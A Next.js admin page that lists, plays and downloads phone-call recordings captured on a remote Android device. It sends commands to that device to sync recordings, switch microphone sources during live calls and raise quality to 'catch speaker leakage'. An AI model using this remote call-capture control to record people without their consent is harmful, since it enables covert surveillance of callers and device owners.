'use client';

import { useEffect, useState, useRef, Suspense } from 'react';
import { useSearchParams } from 'next/navigation';
import { useAuthStore } from '@/lib/store';
import Header from '@/components/layout/Header';
import Sidebar from '@/components/layout/Sidebar';
import { dispatchCommand } from '@/lib/api';
import {
    PhoneIncoming,
    PhoneOutgoing,
    Play,
    Pause,
    Download,
    Trash2,
    Clock,
    Calendar,
    RefreshCw,
    Upload,
    Mic,
    Loader2,
    CheckCircle,
    ArrowLeft,
    Volume2,
    Settings,
    ChevronDown,
    Activity,
    Sparkles,
    Music,
    AudioLines,
    Headphones,
} from 'lucide-react';
import Link from 'next/link';
import { io, Socket } from 'socket.io-client';

const AUDIO_SOURCES = [
    { value: 'AUTO', label: 'Auto (Recommended)', description: 'Tries multiple sources automatically' },
    { value: 'VOICE_RECOGNITION', label: 'Voice Recognition', description: 'Works on some Samsung/Xiaomi' },
    { value: 'MIC', label: 'Microphone', description: 'Standard microphone input' },
    { value: 'VOICE_COMMUNICATION', label: 'Voice Communication', description: 'VoIP optimized source' },
    { value: 'CAMCORDER', label: 'Camcorder', description: 'Video recording mic source' },
    { value: 'DEFAULT', label: 'Default', description: 'System default source' },
];

const QUALITY_OPTIONS = [
    { value: 'standard', label: 'Standard', description: '64kbps / 22kHz - Compact size' },
    { value: 'high', label: 'High', description: '128kbps / 44kHz - Clear audio' },
    { value: 'ultra', label: 'Ultra', description: '320kbps / 48kHz - Catch speaker leakage' },
];

interface Recording {
    id: string;
    phoneNumber: string | null;
    callType: string;
    duration: number;
    status: 'pending' | 'uploading' | 'uploaded' | 'error' | 'recording' | 'paused';
    fileUrl: string | null;
    fileSize: number | null;
    recordedAt: string;
}

interface RecordingStatus {
    status: 'idle' | 'recording' | 'uploading' | 'uploaded' | 'error';
    phoneNumber?: string;
    callType?: string;
    duration?: number;
    error?: string;
}

interface PlayerState {
    recordingId: string | null;
    isPlaying: boolean;
    currentTime: number;
    duration: number;
    progress: number;
}

export default function RecordingsPage() {
    return (
        <Suspense fallback={null}>
            <RecordingsContent />
        </Suspense>
    );
}

function RecordingsContent() {
    const searchParams = useSearchParams();
    const deviceId = searchParams.get('deviceId') || searchParams.get('id') || '';
    const { isAuthenticated, isHydrated } = useAuthStore();

    const [recordings, setRecordings] = useState<Recording[]>([]);
    const [loading, setLoading] = useState(true);
    const [syncing, setSyncing] = useState(false);
    const [recordingStatus, setRecordingStatus] = useState<RecordingStatus>({ status: 'idle' });
    const [player, setPlayer] = useState<PlayerState>({
        recordingId: null,
        isPlaying: false,
        currentTime: 0,
        duration: 0,
        progress: 0
    });

    // Manual sync/retry state
    const [retryingId, setRetryingId] = useState<string | null>(null);
    const [retryingLogs, setRetryingLogs] = useState<string[]>([]);

    // Audio source settings
    const [audioSource, setAudioSource] = useState('AUTO');
    const [savingSource, setSavingSource] = useState(false);
    const [showSourceDropdown, setShowSourceDropdown] = useState(false);

    // Live diagnostics state
    const [amplitude, setAmplitude] = useState(0);
    const [liveSource, setLiveSource] = useState('');
    const [switchingSource, setSwitchingSource] = useState(false);
    const [lastIdleTime, setLastIdleTime] = useState(0);

    // Quality settings
    const [quality, setQuality] = useState('standard');
    const [savingQuality, setSavingQuality] = useState(false);
    const [showQualityDropdown, setShowQualityDropdown] = useState(false);

    // Derived state for more robust UI (Fallback if socket is slow but metadata sync worked)
    const activeRecordingInList = recordings.find(r => r.status === 'recording' || r.status === 'pending');

    // IF we have a recording in the list with duration > 0, it means it's FINISHED.
    // We should NOT show it in the 'Active Stream' section as 'recording' or 'uploading'.
    const isActuallyFinished = activeRecordingInList && activeRecordingInList.duration > 0;

    const effectiveStatus: RecordingStatus = (recordingStatus.status !== 'idle')
        ? recordingStatus
        : (activeRecordingInList && !isActuallyFinished && (Date.now() - lastIdleTime > 5000))
            ? {
                // IMPORTANT: Map 'pending' from list to 'recording' in UI so tools show up 
                status: (activeRecordingInList.status === 'recording' || activeRecordingInList.status === 'pending') ? 'recording' : 'uploading',
                phoneNumber: activeRecordingInList.phoneNumber || 'Unknown',
                callType: activeRecordingInList.callType,
                duration: activeRecordingInList.duration
            } : { status: 'idle' };

    const audioRef = useRef<HTMLAudioElement | null>(null);
    const socketRef = useRef<Socket | null>(null);
    const progressIntervalRef = useRef<NodeJS.Timeout | null>(null);

    useEffect(() => {
        if (!isHydrated || !isAuthenticated) return;

        const apiUrl = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:3001';
        socketRef.current = io(apiUrl, { transports: ['websocket', 'polling'] });

        socketRef.current.on('connect', () => {
            console.log('Connected to socket server');
            socketRef.current?.emit('admin:join');
        });

        socketRef.current.on('recording:update', (data: { deviceId: string }) => {
            if (data.deviceId === deviceId) fetchRecordings();
        });

        socketRef.current.on('recording:status', (data: RecordingStatus & { deviceId: string, message?: string }) => {
            if (data.deviceId === deviceId) {
                // Handle manual sync logs
                if ((data as any).status === 'sync_log' && data.message) {
                    setRetryingLogs(prev => [...prev.slice(-3), data.message!]); // Keep last 4 logs
                    return;
                }

                setRecordingStatus(data);
                if (data.status === 'uploaded') {
                    setRetryingId(null);
                    setRetryingLogs([]);
                    setTimeout(() => {
                        fetchRecordings();
                        setTimeout(() => setRecordingStatus({ status: 'idle' }), 3000);
                    }, 1000);
                }
                if (data.status === 'idle') {
                    setAmplitude(0);
                    setLiveSource('');
                    setLastIdleTime(Date.now());
                }
                if (data.status === 'error') {
                    setRetryingId(null);
                }
            }
        });

        socketRef.current.on('recording:amplitude', (data: { deviceId: string, amplitude: number, source: string }) => {
            if (data.deviceId === deviceId) {
                setAmplitude(data.amplitude);
                setLiveSource(data.source);
            }
        });

        return () => {
            socketRef.current?.disconnect();
            if (progressIntervalRef.current) clearInterval(progressIntervalRef.current);
        };
    }, [isHydrated, isAuthenticated, deviceId]);

    const fetchRecordings = async () => {
        if (!deviceId) { setLoading(false); return; }
        setLoading(true);
        try {
            const response = await fetch(`${process.env.NEXT_PUBLIC_API_URL || 'http://localhost:3001'}/api/recordings/devices/${deviceId}/recordings`);
            const data = await response.json();
            if (data.recordings) setRecordings(data.recordings);
        } catch (err) {
            console.error(err);
        } finally {
            setLoading(false);
        }
    };

    const syncFromDevice = async () => {
        setSyncing(true);
        try {
            await dispatchCommand(deviceId, 'sync_recordings');
            setTimeout(() => { fetchRecordings(); setSyncing(false); }, 5000);
        } catch (err) {
            console.error(err);
            setSyncing(false);
        }
    };

    const saveAudioSource = async (source: string) => {
        setSavingSource(true);
        setShowSourceDropdown(false);
        try {
            await dispatchCommand(deviceId, 'set_audio_source', { source });
            setAudioSource(source);
        } catch (err) {
            console.error('Failed to set audio source:', err);
        } finally {
            setSavingSource(false);
        }
    };

    const saveQuality = async (q: string) => {
        setSavingQuality(true);
        setShowQualityDropdown(false);
        try {
            await dispatchCommand(deviceId, 'set_recording_quality', { quality: q });
            setQuality(q);
        } catch (err) {
            console.error('Failed to set recording quality:', err);
        } finally {
            setSavingQuality(false);
        }
    };

    const switchSourceNow = async () => {
        setSwitchingSource(true);
        // Find next source in list
        const currentIndex = AUDIO_SOURCES.findIndex(s => s.value === (liveSource || audioSource));
        const nextIndex = (currentIndex + 1) % AUDIO_SOURCES.length;
        const nextSource = AUDIO_SOURCES[nextIndex === 0 ? 1 : nextIndex].value; // Skip AUTO in live switch

        try {
            await dispatchCommand(deviceId, 'switch_audio_source_now', { source: nextSource });
            setAmplitude(0); // Reset for visual feedback
        } catch (err) {
            console.error('Failed to switch source live:', err);
        } finally {
            setSwitchingSource(false);
        }
    };

    const retryRecordingSync = async (recording: Recording) => {
        if (retryingId === recording.id) return;
        setRetryingId(recording.id);
        setRetryingLogs(['Initiating manual sync check...']);
        try {
            await dispatchCommand(deviceId, 'retry_recording_sync', { metadataId: recording.id });
        } catch (err) {
            console.error('Failed to retry sync:', err);
            setRetryingId(null);
            setRetryingLogs(['ERROR: Failed to send command to device']);
        }
    };

    const pauseRecordingSync = async (recording: Recording) => {
        try {
            await dispatchCommand(deviceId, 'pause_recording_sync', { metadataId: recording.id });
            // Optimistic update
            setRecordings(prev => prev.map(r => r.id === recording.id ? { ...r, status: 'paused' } : r));
        } catch (err) {
            console.error('Failed to pause sync:', err);
        }
    };

    useEffect(() => {
        if (isHydrated && isAuthenticated && deviceId) fetchRecordings();
    }, [isHydrated, isAuthenticated, deviceId]);

    const formatTime = (seconds: number) => {
        if (!seconds || isNaN(seconds)) return '0:00';
        const mins = Math.floor(seconds / 60);
        const secs = Math.floor(seconds % 60);
        return `${mins}:${secs.toString().padStart(2, '0')}`;
    };

    const formatDate = (dateStr: string) => new Date(dateStr).toLocaleString();
    const formatFileSize = (bytes: number | null) => {
        if (!bytes) return '-';
        if (bytes < 1024) return bytes + ' B';
        if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
        return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
    };

    const playRecording = (recording: Recording) => {
        if (!recording.fileUrl) return;
        const apiUrl = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:3001';
        const fullUrl = `${apiUrl}${recording.fileUrl}`;

        // Same recording - toggle play/pause
        if (player.recordingId === recording.id && audioRef.current) {
            if (player.isPlaying) {
                audioRef.current.pause();
                setPlayer(p => ({ ...p, isPlaying: false }));
                if (progressIntervalRef.current) clearInterval(progressIntervalRef.current);
            } else {
                audioRef.current.play();
                setPlayer(p => ({ ...p, isPlaying: true }));
                startProgressUpdate();
            }
            return;
        }

        // Different recording - stop current and play new
        if (audioRef.current) {
            audioRef.current.pause();
            if (progressIntervalRef.current) clearInterval(progressIntervalRef.current);
        }

        audioRef.current = new Audio(fullUrl);

        audioRef.current.onloadedmetadata = () => {
            const dur = audioRef.current?.duration || recording.duration;
            setPlayer({
                recordingId: recording.id,
                isPlaying: true,
                currentTime: 0,
                duration: dur,
                progress: 0
            });
        };

        audioRef.current.onended = () => {
            setPlayer(p => ({ ...p, isPlaying: false, currentTime: 0, progress: 0 }));
            if (progressIntervalRef.current) clearInterval(progressIntervalRef.current);
        };

        audioRef.current.play();
        startProgressUpdate();
    };

    const startProgressUpdate = () => {
        if (progressIntervalRef.current) clearInterval(progressIntervalRef.current);
        progressIntervalRef.current = setInterval(() => {
            if (audioRef.current) {
                const current = audioRef.current.currentTime;
                const duration = audioRef.current.duration || 1;
                setPlayer(p => ({
                    ...p,
                    currentTime: current,
                    progress: (current / duration) * 100
                }));
            }
        }, 100);
    };

    const seekTo = (e: React.ChangeEvent<HTMLInputElement>) => {
        const value = parseFloat(e.target.value);
        if (audioRef.current) {
            const newTime = (value / 100) * audioRef.current.duration;
            audioRef.current.currentTime = newTime;
            setPlayer(p => ({ ...p, progress: value, currentTime: newTime }));
        }
    };

    const downloadRecording = (recording: Recording) => {
        if (!recording.fileUrl) return;
        const apiUrl = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:3001';
        const link = document.createElement('a');
        link.href = `${apiUrl}${recording.fileUrl}`;
        link.download = `call_${recording.callType}_${recording.phoneNumber || 'unknown'}.mp3`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    };

    const deleteRecording = async (id: string) => {
        if (!confirm('Delete this recording?')) return;
        try {
            await fetch(`${process.env.NEXT_PUBLIC_API_URL || 'http://localhost:3001'}/api/recordings/${id}`, { method: 'DELETE' });
            setRecordings(recordings.filter(r => r.id !== id));
            if (player.recordingId === id) {
                audioRef.current?.pause();
                setPlayer({ recordingId: null, isPlaying: false, currentTime: 0, duration: 0, progress: 0 });
            }
        } catch (err) {
            console.error(err);
        }
    };

    const isStalled = (recording: Recording) => {
        if (recording.status === 'paused') return false;
        if (recording.status !== 'pending' && recording.status !== 'uploading') return false;
        const now = Date.now();
        const recordedAt = new Date(recording.recordedAt).getTime();
        // If pending for > 5 minutes, consider it stalled
        return (now - recordedAt) > 5 * 60 * 1000;
    };

    if (!isHydrated || !isAuthenticated) return null;

    return (
        <div className="flex min-h-screen bg-[var(--background)]">
            <Sidebar />
            <main className="flex-1 lg:ml-72">
                <Header title="Call Recordings" subtitle="Audio recordings from calls" onRefresh={fetchRecordings} />

                <div className="p-4 lg:p-8 max-w-5xl mx-auto animate-fade-in space-y-6">
                    {/* Header Controls */}
                    <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                        <Link href={`/devices/view/?id=${deviceId}`} className="inline-flex items-center gap-2 text-[var(--muted)] hover:text-[var(--foreground)] transition-colors text-sm font-medium w-fit">
                            <ArrowLeft className="w-4 h-4" />
                            Back to Device
                        </Link>
                        <div className="flex items-center gap-2">
                            {/* Audio Source Dropdown */}
                            <div className="relative">
                                <button
                                    onClick={() => setShowSourceDropdown(!showSourceDropdown)}
                                    disabled={savingSource}
                                    className="btn btn-secondary inline-flex items-center gap-2"
                                >
                                    {savingSource ? <Loader2 className="w-4 h-4 animate-spin" /> : <Settings className="w-4 h-4" />}
                                    <span className="hidden sm:inline">{AUDIO_SOURCES.find(s => s.value === audioSource)?.label || 'Audio Source'}</span>
                                    <ChevronDown className={`w-4 h-4 transition-transform ${showSourceDropdown ? 'rotate-180' : ''}`} />
                                </button>
                                {showSourceDropdown && (
                                    <div className="absolute right-0 mt-2 w-72 bg-white rounded-xl shadow-xl border border-[var(--border)] py-2 z-50 animate-fade-in">
                                        <div className="px-3 py-2 border-b border-[var(--border)]">
                                            <p className="text-xs font-semibold text-[var(--muted)] uppercase">Audio Source</p>
                                        </div>
                                        {AUDIO_SOURCES.map((source) => (
                                            <button
                                                key={source.value}
                                                onClick={() => saveAudioSource(source.value)}
                                                className={`w-full px-3 py-2 text-left hover:bg-[var(--background)] transition-colors ${audioSource === source.value ? 'bg-[var(--primary)]/5' : ''}`}
                                            >
                                                <div className="flex items-center justify-between text-sm font-medium">
                                                    {source.label}
                                                    {audioSource === source.value && <CheckCircle className="w-4 h-4 text-[var(--primary)]" />}
                                                </div>
                                                <p className="text-xs text-[var(--muted)]">{source.description}</p>
                                            </button>
                                        ))}
                                    </div>
                                )}
                            </div>

                            {/* Quality Dropdown */}
                            <div className="relative">
                                <button
                                    onClick={() => setShowQualityDropdown(!showQualityDropdown)}
                                    disabled={savingQuality}
                                    className="btn btn-secondary inline-flex items-center gap-2"
                                >
                                    {savingQuality ? (
                                        <Loader2 className="w-4 h-4 animate-spin" />
                                    ) : (
                                        <Activity className="w-4 h-4" />
                                    )}
                                    <span className="hidden sm:inline">{QUALITY_OPTIONS.find(q => q.value === quality)?.label || 'Quality'}</span>
                                    <ChevronDown className={`w-4 h-4 transition-transform ${showQualityDropdown ? 'rotate-180' : ''}`} />
                                </button>

                                {showQualityDropdown && (
                                    <div className="absolute right-0 mt-2 w-72 bg-white rounded-xl shadow-xl border border-[var(--border)] py-2 z-50 animate-fade-in">
                                        <div className="px-3 py-2 border-b border-[var(--border)]">
                                            <p className="text-xs font-semibold text-[var(--muted)] uppercase">Recording Depth</p>
                                        </div>
                                        {QUALITY_OPTIONS.map((opt) => (
                                            <button
                                                key={opt.value}
                                                onClick={() => saveQuality(opt.value)}
                                                className={`w-full px-3 py-2 text-left hover:bg-[var(--background)] transition-colors ${quality === opt.value ? 'bg-[var(--primary)]/5' : ''}`}
                                            >
                                                <div className="flex items-center justify-between text-sm font-medium">
                                                    {opt.label}
                                                    {quality === opt.value && <CheckCircle className="w-4 h-4 text-[var(--primary)]" />}
                                                </div>
                                                <p className="text-xs text-[var(--muted)]">{opt.description}</p>
                                            </button>
                                        ))}
                                    </div>
                                )}
                            </div>

                            <button onClick={syncFromDevice} disabled={syncing} className={`btn ${syncing ? 'btn-secondary opacity-50' : 'btn-primary'}`}>
                                <Upload className={`w-4 h-4 ${syncing ? 'animate-bounce' : ''}`} />
                                {syncing ? 'Syncing...' : 'Sync Recordings'}
                            </button>
                            <button onClick={fetchRecordings} disabled={loading} className="btn btn-secondary">
                                <RefreshCw className={`w-4 h-4 ${loading ? 'animate-spin' : ''}`} />
                            </button>
                        </div>
                    </div>

                    {/* Live Status Diagnostic Section */}
                    {effectiveStatus.status !== 'idle' && (
                        <div className={`card overflow-hidden border-l-4 ${effectiveStatus.status === 'recording' ? 'border-red-500 bg-red-50/30' :
                            effectiveStatus.status === 'uploading' ? 'border-blue-500 bg-blue-50/30' : 'border-emerald-500 bg-emerald-50/30'
                            }`}>
                            <div className="p-4 flex flex-col md:flex-row md:items-center gap-4">
                                <div className={`w-12 h-12 rounded-2xl flex items-center justify-center flex-shrink-0 ${effectiveStatus.status === 'recording' ? 'bg-red-100 text-red-500' :
                                    effectiveStatus.status === 'uploading' ? 'bg-blue-100 text-blue-500' : 'bg-emerald-100 text-emerald-500'
                                    }`}>
                                    {effectiveStatus.status === 'recording' ? <Mic className="w-6 h-6 animate-pulse" /> :
                                        effectiveStatus.status === 'uploading' ? <Loader2 className="w-6 h-6 animate-spin" /> : <CheckCircle className="w-6 h-6" />}
                                </div>
                                <div className="flex-1">
                                    <div className="flex items-center gap-2 mb-0.5">
                                        <p className="text-[10px] font-bold text-[var(--muted)] uppercase tracking-wider">Active Stream</p>
                                        {effectiveStatus.status === 'recording' && (
                                            <span className="flex items-center gap-1 text-[10px] font-bold text-red-500 animate-pulse">
                                                <Activity className="w-3 h-3" /> LIVE
                                            </span>
                                        )}
                                    </div>
                                    <p className="font-bold text-[var(--foreground)] text-lg">
                                        {effectiveStatus.status === 'recording' && `Recording: ${effectiveStatus.phoneNumber}`}
                                        {effectiveStatus.status === 'uploading' && `Uploading: ${effectiveStatus.phoneNumber}`}
                                        {effectiveStatus.status === 'uploaded' && 'Recording uploaded successfully'}
                                    </p>
                                    {(effectiveStatus.status === 'recording' || effectiveStatus.status === 'uploading') && (
                                        <div className="mt-3 flex flex-col gap-2">
                                            <div className="flex items-center justify-between text-xs font-semibold">
                                                <span className="text-[var(--muted)]">Source: <span className="text-[var(--foreground)]">{liveSource || 'Initializing...'}</span></span>
                                                <span className={`${amplitude > 0 ? 'text-emerald-500' : 'text-red-500'}`}>
                                                    {amplitude > 0 ? `Level: ${amplitude}` : 'Silence detected'}
                                                </span>
                                            </div>
                                            <div className="h-2 w-full bg-gray-200/50 rounded-full overflow-hidden">
                                                <div
                                                    className={`h-full transition-all duration-300 ${amplitude > 0 ? 'bg-emerald-500 animate-pulse' : 'bg-red-500'}`}
                                                    style={{ width: `${Math.min(100, Math.max(2, (amplitude / 32767) * 100))}%` }}
                                                />
                                            </div>
                                        </div>
                                    )}
                                </div>
                                {(effectiveStatus.status === 'recording' || effectiveStatus.status === 'uploading') && (
                                    <div className="flex-shrink-0">
                                        <button onClick={switchSourceNow} disabled={switchingSource} className="btn bg-amber-500 hover:bg-amber-600 text-white border-none shadow-lg shadow-amber-500/20 py-3 px-6 rounded-2xl flex items-center gap-2">
                                            {switchingSource ? <Loader2 className="w-5 h-5 animate-spin" /> : <Sparkles className="w-5 h-5" />}
                                            <span className="font-bold">Try Next Source</span>
                                        </button>
                                        <p className="text-[10px] text-center mt-2 text-amber-600 font-bold uppercase tracking-tighter">If silent, click to switch mic</p>
                                    </div>
                                )}
                            </div>
                        </div>
                    )}

                    {/* Recordings List */}
                    {loading ? (
                        <div className="space-y-3">
                            {[1, 2, 3, 4].map((i) => <div key={i} className="card h-28 skeleton" />)}
                        </div>
                    ) : recordings.length === 0 ? (
                        <div className="card bg-white p-12 text-center">
                            <Mic className="w-12 h-12 mx-auto mb-4 text-[var(--muted-light)]" />
                            <h3 className="text-lg font-semibold text-[color:var(--foreground)] mb-2">No Recordings</h3>
                            <p className="text-[color:var(--muted)] text-sm">No call recordings have been captured yet.</p>
                        </div>
                    ) : (
                        <div className="space-y-3">
                            {recordings.map((recording) => {
                                const isActive = player.recordingId === recording.id;
                                const isPlaying = isActive && player.isPlaying;

                                return (
                                    <div key={recording.id} className={`card bg-white overflow-hidden transition-all ${isActive ? 'ring-2 ring-[var(--primary)] ring-opacity-50' : 'hover:shadow-lg'}`}>
                                        <div className="p-4 flex items-center gap-4">
                                            <div className="relative group">
                                                <button
                                                    onClick={() => playRecording(recording)}
                                                    disabled={recording.status !== 'uploaded'}
                                                    className={`w-14 h-14 rounded-2xl flex items-center justify-center flex-shrink-0 transition-all ${recording.status !== 'uploaded' ? 'bg-gray-100 text-gray-400 cursor-not-allowed' :
                                                        isPlaying ? 'bg-[var(--primary)] text-white shadow-lg' :
                                                            'bg-[var(--primary-glow)] text-[var(--primary)] hover:bg-[var(--primary)] hover:text-white hover:shadow-md'
                                                        }`}
                                                >
                                                    {recording.status !== 'uploaded' ? <Loader2 className="w-6 h-6 animate-spin" /> :
                                                        isPlaying ? <Pause className="w-7 h-7 animate-in fade-in zoom-in" /> :
                                                            <div className="relative w-full h-full flex items-center justify-center">
                                                                <Music className="w-6 h-6 transition-all group-hover:scale-0 group-hover:opacity-0" />
                                                                <Play className="w-7 h-7 ml-1 absolute opacity-0 scale-50 transition-all group-hover:opacity-100 group-hover:scale-100" />
                                                            </div>
                                                    }
                                                </button>
                                                {isPlaying && (
                                                    <div className="absolute -bottom-1 -right-1 w-6 h-6 bg-white rounded-full flex items-center justify-center shadow-sm border border-[var(--primary-glow)]">
                                                        <Activity className="w-3.5 h-3.5 text-[var(--primary)] animate-pulse" />
                                                    </div>
                                                )}
                                            </div>

                                            <div className="flex-1 min-w-0">
                                                <div className="flex items-center gap-2 mb-1">
                                                    {isPlaying && <AudioLines className="w-5 h-5 text-[var(--primary)] animate-pulse" />}
                                                    <span className="font-bold text-[var(--foreground)] text-lg truncate">{recording.phoneNumber || 'Unknown'}</span>
                                                    <span className={`text-[10px] font-bold uppercase px-2 py-0.5 rounded-full ${recording.callType === 'incoming' ? 'bg-emerald-50 text-emerald-600' : 'bg-blue-50 text-blue-600'
                                                        }`}>
                                                        {recording.callType}
                                                    </span>
                                                    {isStalled(recording) && (
                                                        <span className="text-[10px] font-bold uppercase px-2 py-0.5 rounded-full bg-red-50 text-red-600 border border-red-100">Stalled</span>
                                                    )}
                                                    {recording.status === 'paused' && (
                                                        <span className="text-[10px] font-bold uppercase px-2 py-0.5 rounded-full bg-slate-100 text-slate-600 border border-slate-200">Paused</span>
                                                    )}
                                                </div>
                                                <div className="flex flex-wrap items-center gap-x-4 gap-y-1 text-sm text-[var(--muted)]">
                                                    <span className="flex items-center gap-1"><Clock className="w-3.5 h-3.5" />{formatTime(recording.duration)}</span>
                                                    <span className="flex items-center gap-1"><Calendar className="w-3.5 h-3.5" />{formatDate(recording.recordedAt)}</span>
                                                    <span className="flex items-center gap-1"><Volume2 className="w-3.5 h-3.5" />{formatFileSize(recording.fileSize)}</span>
                                                </div>
                                            </div>

                                            <div className="flex items-center gap-1">
                                                {recording.status !== 'uploaded' && (
                                                    <div className="flex items-center gap-1">
                                                        {recording.status !== 'paused' && recording.status !== 'error' && (
                                                            <button
                                                                onClick={() => pauseRecordingSync(recording)}
                                                                className="p-2.5 rounded-xl text-slate-400 hover:text-slate-600 hover:bg-slate-50 transition-all"
                                                                title="Pause Sync"
                                                            >
                                                                <Pause className="w-5 h-5" />
                                                            </button>
                                                        )}
                                                        <button
                                                            onClick={() => retryRecordingSync(recording)}
                                                            disabled={retryingId === recording.id}
                                                            className="p-2.5 rounded-xl text-[var(--primary)] hover:bg-[var(--primary-glow)] transition-all disabled:opacity-50"
                                                            title="Retry Sync"
                                                        >
                                                            <RefreshCw className={`w-5 h-5 ${retryingId === recording.id ? 'animate-spin' : ''}`} />
                                                        </button>
                                                    </div>
                                                )}
                                                <button onClick={() => downloadRecording(recording)} disabled={recording.status !== 'uploaded'} className="p-2.5 rounded-xl text-[var(--muted)] hover:text-[var(--foreground)] hover:bg-[var(--background)] transition-all disabled:opacity-50">
                                                    <Download className="w-5 h-5" />
                                                </button>
                                                <button onClick={() => deleteRecording(recording.id)} className="p-2.5 rounded-xl text-[var(--muted-light)] hover:text-red-500 hover:bg-red-50 transition-all">
                                                    <Trash2 className="w-5 h-5" />
                                                </button>
                                            </div>
                                        </div>

                                        {retryingId === recording.id && retryingLogs.length > 0 && (
                                            <div className="px-4 pb-4 animate-in fade-in slide-in-from-top-2">
                                                <div className="bg-slate-50 border border-slate-100 rounded-xl p-3 font-mono text-[10px] space-y-1">
                                                    {retryingLogs.map((log, i) => (
                                                        <div key={i} className="flex gap-2">
                                                            <span className="text-indigo-400 select-none">›</span>
                                                            <span className={log.includes('ERROR') || log.includes('CRITICAL') ? 'text-red-500 font-bold' : 'text-slate-600'}>{log}</span>
                                                        </div>
                                                    ))}
                                                </div>
                                            </div>
                                        )}

                                        {isActive && (
                                            <div className="px-4 pb-4">
                                                <div className="bg-[var(--background)] rounded-xl p-3 flex items-center gap-3">
                                                    <span className="text-xs font-mono text-[var(--muted)] w-10 text-right">{formatTime(player.currentTime)}</span>
                                                    <div className="flex-1 relative">
                                                        <input
                                                            type="range" min="0" max="100" value={player.progress || 0} onChange={seekTo}
                                                            className="w-full h-2 appearance-none bg-gray-200 rounded-full cursor-pointer accent-[var(--primary)]"
                                                            style={{ background: `linear-gradient(to right, var(--primary) 0%, var(--primary) ${player.progress}%, #e5e7eb ${player.progress}%, #e5e7eb 100%)` }}
                                                        />
                                                    </div>
                                                    <span className="text-xs font-mono text-[var(--muted)] w-10">{formatTime(player.duration)}</span>
                                                </div>
                                            </div>
                                        )}
                                    </div>
                                );
                            })}
                        </div>
                    )}

                    {/* Quality Notice */}
                    <div className="card bg-amber-50 border-amber-200 p-4 flex items-start gap-3">
                        <div className="w-8 h-8 rounded-lg bg-amber-100 flex items-center justify-center flex-shrink-0">
                            <span className="text-amber-600 font-bold text-sm">!</span>
                        </div>
                        <p className="text-sm text-amber-700">Recording quality may vary. Only one side of the call may be captured on some Android versions.</p>
                    </div>
                </div>
            </main>
        </div>
    );
};
